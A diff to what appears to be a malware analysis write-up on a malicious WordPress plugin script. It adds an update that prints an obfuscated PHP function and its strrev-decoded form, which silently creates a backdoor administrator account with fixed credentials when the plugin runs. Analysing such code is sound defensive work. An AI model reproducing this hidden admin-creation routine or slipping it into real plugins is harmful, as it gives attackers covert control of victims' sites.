@@ -78,4 +78,51 @@ backwards (that is why at line 20 of [awful/glues_it/glues_it_CLEANED.php](http:
 wp-admin/includes/user.php
 ```
 
-I still don't know yet why the creator of this script uses that file, but maybe is using it to, in someway, to get advantage of Wordpress own code to accomplish his goal of getting the victims site url, username and password.
+I still don't know yet why the creator of this script uses that file, since both files (as of Wordpress 4.3) are identical, but maybe is using it to, in someway, to get advantage of Wordpress own code to accomplish his goal of getting the victims site username and password.
+
+### Update 7
+A friend noticed the following on lines 109-126 of [awful/glues_it/glues_it_CLEANED.php](http://git.io/vs0cs):
+```sh
+function wp_en_four()
+{
+    $object_quince = 'strrev';
+    $object_quince_pim = glues_it($object_quince);
+    $nigol = call_user_func($object_quince_pim, 'dxtroppus');
+    $wssap = call_user_func($object_quince_pim, 'retroppus_pw');
+    $laime = call_user_func($object_quince_pim, 'moc.niamodym@1tccaym');
+
+    if (!username_exists($nigol) && !email_exists($laime)) {
+        $wp_ver_one = call_user_func($object_quince_pim, 'resu_etaerc_pw');
+        $user_id = call_user_func_array($wp_ver_one, array($nigol, $wssap, $laime));
+        $rotartsinimda = call_user_func($object_quince_pim, 'rotartsinimda');
+        $resu_etadpu_pw = call_user_func($object_quince_pim, 'resu_etadpu_pw');
+        $rolx = call_user_func($object_quince_pim, 'elor');
+        call_user_func($resu_etadpu_pw, array('ID' => $user_id, $rolx => $rotartsinimda));
+
+    }
+}
+```
+
+When we run strrev on this part of the code we get the following =:
+```sh
+function wp_en_four()
+{
+    $object_quince = 'strrev';
+    $object_quince_pim = glues_it($object_quince);
+    $login = call_user_func($object_quince_pim, 'supportxd');
+    $passw = call_user_func($object_quince_pim, 'wp_supporter');
+    $email = call_user_func($object_quince_pim, 'myacct1@mydomain.com');
+
+    if (!username_exists($login) && !email_exists($email)) {
+        $wp_ver_one = call_user_func($object_quince_pim, 'wp_create_user');
+        $user_id = call_user_func_array($wp_ver_one, array($login, $passw, $email));
+        $administrator = call_user_func($object_quince_pim, 'administrator');
+        $resu_etadpu_pw = call_user_func($object_quince_pim, 'wp_update_user');
+        $rolx = call_user_func($object_quince_pim, 'role');
+        call_user_func($wp_update_user, array('ID' => $user_id, $rolx => $administrator));
+
+    }
+}
+```
+
+This finally confirms the fact that an account with full admin privileges is been created when the plugin is installed and running on the live site. This will enable the code creator to login without any issues to the Wordpress site.
